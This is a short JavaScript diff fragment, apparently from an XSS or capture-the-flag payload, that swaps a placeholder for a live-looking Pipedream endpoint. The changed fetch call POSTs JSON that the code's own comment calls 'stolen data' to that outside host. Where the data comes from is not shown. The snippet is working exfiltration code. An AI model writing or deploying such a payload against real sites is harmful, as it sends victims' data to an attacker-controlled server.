@@ -49,7 +49,7 @@
     .then(response => response.json())
     .then(data => {
       // Send the stolen data to Pipedream
-      fetch("https://your-pipedream-url.pipedream.com", {  // Replace with your Pipedream URL
+      fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {  // Replace with your Pipedream URL
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ stolenData: data })
